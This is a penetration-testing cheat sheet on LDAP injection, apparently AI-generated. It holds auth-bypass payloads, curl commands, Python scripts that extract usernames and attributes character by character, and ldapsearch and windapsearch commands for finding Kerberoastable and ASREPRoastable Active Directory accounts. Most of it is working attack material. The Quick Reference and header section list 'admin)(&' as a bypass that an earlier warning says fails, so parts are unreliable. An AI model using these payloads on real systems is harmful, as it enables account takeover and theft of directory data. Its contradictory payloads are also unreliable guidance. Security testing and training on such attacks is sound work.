# LDAP Injection

#LDAPi #Injection #WebAppAttacks #ActiveDirectory


## What is this?

LDAP query injection via unsanitized input — enables auth bypass, attribute enumeration, and blind data extraction. Common in directory-integrated apps. Pairs with [[SQL Injection]], [[Web Attacks]].


---

## Tools

| Tool | Purpose |
|---|---|
| `Burp Suite` | Intercept login requests, inject LDAP payloads, Intruder with SecLists LDAP wordlist |
| `ldapsearch` | Manual enumeration and auth bypass testing — `ldapsearch -x -H ldap://<target> -b "dc=target,dc=com" "(objectClass=*)"` |
| `ldapdomaindump` | Enumerate AD over LDAP and output HTML/JSON — `ldapdomaindump -u 'domain\user' -p 'pass' <dc-ip>` |
| `Metasploit` | `auxiliary/scanner/ldap/ldap_login` for credential brute-force |
| `windapsearch` | LDAP-based AD enumeration — users, groups, computers, DAs — `git clone https://github.com/ropnop/windapsearch` (run `./windapsearch.py --dc-ip <ip> …`) |
| SecLists | LDAP injection strings — `/usr/share/seclists/Fuzzing/LDAP.Fuzzing.txt` |

---

## LDAP Filter Basics

```bash
# Standard auth query:
(&(uid=<username>)(password=<password>))

# Operators:
# &  = AND
# |  = OR
# !  = NOT
# *  = wildcard (any value)
# Special chars: ( ) * \ NUL
```

> [!note] Two backend models — know which you're hitting:
> - **Compare-in-filter** (shown above): the password is a clause in the search filter, so neutralizing it (`password=*`, empty `(&)`, or NUL truncation) bypasses auth directly.
> - **Search-then-bind** (more common in real AD apps): the app first searches for the user, then does a separate LDAP **bind** with the supplied password. Here injection lives in the *search* filter, but a wildcard password won't bind — so you enumerate via **differential responses** ("invalid user" vs "invalid password"), not login success.
>
> Defense: escape filter metacharacters per RFC 4515 (`* → \2a`, `( → \28`, `) → \29`, `\ → \5c`, `NUL → \00`) / use parameterized filter builders.

---

## Authentication Bypass

```bash
# Target: (&(uid=<USER>)(password=<PASS>))
# KEY RULE: the injected filter must stay PAREN-BALANCED *and* neutralize the
# (password=...) clause — otherwise it's still ANDed and login fails on a match.

# Classic bypass — close uid, OR-in an always-true, swallow the password clause
# Input username: *)(|(uid=*
# Input password: *
# Result: (&(uid=*)(|(uid=*)(password=*)))   ← balanced; OR(uid=*, password=*) = true
# → matches first user (usually admin)

# Wildcard username bypass — match any user (requires a set password attribute)
# Input username: *
# Input password: *
# Result: (&(uid=*)(password=*))
# → matches first user found

# Inject into password field — make password condition always true
# Input password: *)(&
# Result: (&(uid=admin)(password=*)(&))   ← balanced; password=* + empty AND(true)
# → password=* matches any set value

# Bypass both fields
# username: *)(|(&
# password: pwd)
# Result: (&(uid=*)(|(&)(password=pwd)))   ← balanced; OR(true, password=pwd) = true

# Null-byte truncation — chop the whole password clause off (backend must honor NUL)
# Input username: admin)(uid=*))%00
# Result: (&(uid=admin)(uid=*))   ← rest of the filter is truncated after the NUL

# WARNING — these are UNBALANCED / still-ANDed and will NOT bypass:
#   admin)(&(|      → (&(uid=admin)(&(|)(password=...))   5 opens / 4 closes → parse error
#   )(|(|           → unbalanced → parse error
#   admin)(&        → balanced but (password=...) stays ANDed → no bypass
#   admin)(&(uid=admin → balanced but password stays ANDed → no bypass

# Payloads that DO work (username field), password = *:
#   *)(|(uid=*
#   *
#   admin)(uid=*))%00     (null-truncation)
# Password field:
#   *)(&
#   *
```

```bash
# Test via curl — let --data-urlencode encode the metacharacters for you
curl -s -X POST "http://<target>/login" \
  --data-urlencode "username=*)(|(uid=*" \
  --data-urlencode "password=*"

# application/json body
curl -s -X POST "http://<target>/api/login" -H "Content-Type: application/json" \
  -d '{"username":"*)(|(uid=*","password":"*"}'
```

---

## Enumeration — Valid Usernames

```bash
# Wildcard-based enumeration — does username "a*" exist?
# username: a*   password: *   → (&(uid=a*)(password=*))
# The password clause must be neutralized (wildcard here), or every request fails
# regardless of match. Success/redirect = a user with that prefix exists.

# Script to enumerate users (login-success oracle)
for prefix in a b c d e f admin user test root john; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://<target>/login" \
    --data-urlencode "username=${prefix}*" --data-urlencode "password=*")
  [ "$resp" = "302" ] && echo "[+] Prefix '$prefix' matches a valid user"
done

# Brute force character by character
python3 << 'EOF'
import requests, string

url = "http://<target>/login"
found = ""
chars = string.ascii_lowercase + string.digits + "_-."

while True:
    for c in chars:
        test = found + c
        # uid=<test>* AND password=* (wildcard neutralizes the password check)
        r = requests.post(url, data={
            "username": f"{test}*",
            "password": "*"
        }, allow_redirects=False)
        if "Welcome" in r.text or r.status_code == 302:
            found += c
            print(f"[+] Found: {found}")
            break
    else:
        print(f"[*] Username: {found}")
        break
EOF

# No password wildcard? Use a DIFFERENTIAL-RESPONSE oracle instead: many apps
# return "invalid password" (user exists) vs "invalid user" (no match) — compare
# response body/length for username=<test>* with a deliberately wrong password.
```

---

## Attribute Enumeration (Blind)

Extract LDAP attribute values character by character using wildcard matching.

```bash
# Does the user with uid=admin have mail starting with 'a'?
# username: admin)(mail=a*   password: *
# Filter: (&(uid=admin)(mail=a*)(password=*))  ← balanced, password neutralized
# If login succeeds → the char matches

# Enumerate email of admin
python3 << 'EOF'
import requests, string

url = "http://<target>/login"
chars = string.ascii_lowercase + string.digits + "@._-"
found = ""
attr = "mail"   # change to cn, sn, givenName, memberOf, etc.

while True:
    for c in chars:
        test = found + c
        # Add the attr filter, then wildcard the password so it can't block a match:
        # (&(uid=admin)(<attr>=<test>*)(password=*))
        payload = f"admin)({attr}={test}*"
        r = requests.post(url, data={
            "username": payload,
            "password": "*"
        }, allow_redirects=False)
        if "Welcome" in r.text or r.status_code == 302:
            found += c
            print(f"[+] {attr}: {found}")
            break
    else:
        print(f"[*] Final {attr}: {found}")
        break
EOF

# Common attributes to enumerate:
# uid, cn, sn, givenName, mail, memberOf, description, telephoneNumber
# userPassword (if stored as plaintext or weak hash)
# department, title, manager
```

---

## OOB / Blind Extraction via Error Differences

```bash
# Time-based isn't common in LDAP — use response differences:
# - Login success vs failure
# - Page content length difference
# - HTTP redirect vs no redirect
# - Error message difference

# Check if user exists at all:
curl -s -X POST "http://<target>/login" --data-urlencode "username=admin" --data-urlencode "password=*" | wc -c
# vs
curl -s -X POST "http://<target>/login" --data-urlencode "username=doesnotexist12345" --data-urlencode "password=*" | wc -c
# Size difference = user exists check
```

---

## LDAP Injection via HTTP Headers

Apps that log or process HTTP headers through LDAP filters are a less-tested injection point.

```bash
# Test LDAP metacharacters in common headers
curl -s -H "X-Forwarded-For: *(|(uid=*)" "http://<target>/app"
curl -s -H "User-Agent: admin)(&(uid=admin" "http://<target>/app"
curl -s -H "X-Username: *)(|(uid=*" "http://<target>/app"
curl -s -H "Referer: admin)(&" "http://<target>/app"

# If the header value is used in an LDAP filter for session lookup, rate limiting, or user resolution:
# Inject to dump all records: header value → *)(&
# Auth bypass: header value → admin)(&

# Burp: add header to every request via Match & Replace or Session Handling Rule
# Fuzz header values with SecLists LDAP list
ffuf -u "http://<target>/app" -H "X-User: FUZZ" -w /usr/share/seclists/Fuzzing/LDAP.Fuzzing.txt -mc 200,302
```

---

## LDAP Injection in Search/Filter Fields

When app has search functionality backed by LDAP:

```bash
# Common search injection points:
# ?search=<input>   → (&(cn=*<input>*)(objectClass=user))
# ?user=<input>     → (uid=<input>)

# Wildcard dump — match everything
curl -s "http://<target>/search?q=*" | grep -oP "uid=[^,]+"

# Close filter and add OR to dump all objects
# Target: (&(cn=*<input>*)(objectClass=user))
# Input:  *)(|(objectClass=*
# Result: (&(cn=**)(|(objectClass=*)*)(objectClass=user))  → OR(objectClass=*) = everything
curl -s --data-urlencode "search=*)(|(objectClass=*" "http://<target>/search"

# Dump all users
curl -s --data-urlencode "search=)(|(uid=*" "http://<target>/search"

# LDAP injection to access admin records
curl -s --data-urlencode "search=*)(|(memberOf=CN=Admins,DC=corp,DC=local" "http://<target>/search"
```


---

## Active Directory LDAP Specifics

```bash
# AD LDAP filter for all users
(&(objectClass=user)(objectCategory=person))

# AD LDAP injection in Kerberos pre-auth / web apps backed by AD
# Same techniques — inject into search filters

# Password in description (common misconfiguration)
ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" -b "dc=<domain>,dc=com" "(&(objectClass=user))" description | grep -i "pass\|pwd\|cred"

# Users with no pre-auth required (ASREPRoastable)
ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" -b "dc=<domain>,dc=com" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Kerberoastable users (servicePrincipalName set)
ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" -b "dc=<domain>,dc=com" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

---

## windapsearch

```bash
# Install (GitHub script — not a reliable PyPI package)
git clone https://github.com/ropnop/windapsearch && cd windapsearch

# Enumerate domain users
./windapsearch.py --dc-ip <dc-ip> -d <domain> -u <user>@<domain> -p <pass> --users

# Domain admins
./windapsearch.py --dc-ip <dc-ip> -d <domain> -u <user>@<domain> -p <pass> --da

# All groups + members
./windapsearch.py --dc-ip <dc-ip> -d <domain> -u <user>@<domain> -p <pass> --groups

# Computers
./windapsearch.py --dc-ip <dc-ip> -d <domain> -u <user>@<domain> -p <pass> --computers

# Custom filter — all users with SPN set (Kerberoastable)
./windapsearch.py --dc-ip <dc-ip> -d <domain> -u <user>@<domain> -p <pass> --custom "(&(objectClass=user)(servicePrincipalName=*))"
```

## Operational Attributes — Attack Planning Data

```bash
# Get lockout / password status for a specific account
ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" \
  -b "dc=<domain>,dc=com" \
  "(&(objectClass=user)(sAMAccountName=<target_user>))" \
  pwdLastSet lockoutTime badPwdCount badPasswordTime lastLogon userAccountControl

# Decode pwdLastSet / lastLogon (Windows FILETIME → datetime)
python3 -c "
import datetime
ft = <filetime_value>
print(datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=ft//10))
"

# Dump all users + lockout status (hunt for locked or password-never-set accounts)
ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" \
  -b "dc=<domain>,dc=com" \
  "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName pwdLastSet lockoutTime badPwdCount userAccountControl | \
  grep -E "sAMAccountName|pwdLastSet|lockoutTime|badPwdCount"

# Useful userAccountControl flags:
# 512   = normal enabled account
# 514   = disabled
# 66048 = password never expires
# 8388608 = password expired
```

---

## Quick Reference

```bash
# Auth bypass payloads (username field)
admin)(&            # close + always-true
*)(&                # wildcard + always-true
*                   # match any user

# Auth bypass (password field)
*                   # match any password
*)(&                # close + always-true

# Enumerate via wildcard
a*)(&               # users starting with 'a'
*admin*)(&          # users containing 'admin'

# LDAP injection fuzz list
/usr/share/seclists/Fuzzing/LDAP.Fuzzing.txt
```

---

*Created: 2026-03-04*
*Updated: 2026-07-21*
*Model: claude-sonnet-4-6*